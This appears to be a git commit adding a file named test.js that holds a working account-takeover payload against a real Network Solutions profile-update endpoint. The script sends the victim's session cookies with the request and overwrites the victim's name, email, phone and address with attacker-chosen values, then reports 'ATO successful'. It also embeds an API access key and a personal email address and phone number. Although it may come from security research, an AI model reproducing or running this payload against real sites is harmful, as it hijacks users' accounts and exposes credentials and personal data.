f1753ee5a247d1f8e7f2b5f6be66dac9b4462585
Bhanu <Bhanunamikaze@gmail.com>
2026-02-03 17:43:53 +0530

    Create test.js

---
+++ test.js
@@ -0,0 +1,45 @@
+(async function() {
+    try {
+        const response = await fetch('https://www.networksolutions.com/sfcore.do?updateUserProfileInfo', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            credentials: 'include',
+            body: JSON.stringify({
+                "request": {
+                    "requestInfo": {
+                        "service": "UserAPI",
+                        "method": "updateUserProfileInfo",
+                        "clientId": "AccountManager",
+                        "apiAccessKey": "nwmhwqzx0e3pjvtbbeb4utpzovg"
+                    },
+                    "firstName": "hacked",
+                    "lastName": "victim",
+                    "email": "prajwal.prakash+test@newfold.com",
+                    "companyName": "",
+                    "phone": "05444479816",
+                    "address": {
+                        "address1": "zebra test. test",
+                        "address2": "",
+                        "city": "test",
+                        "stateProv": "test",
+                        "postalCode": "test",
+                        "country": "TR",
+                        "vatId": "",
+                        "stateTaxExemptId": "",
+                        "fax": ""
+                    }
+                }
+            })
+        });
+
+        if (response.ok) {
+            alert('ATO successful! Status: ' + response.status);
+        } else {
+            alert('ATO failed! Status: ' + response.status);
+        }
+    } catch (error) {
+        alert('err: ' + error.message);
+    }
+})();
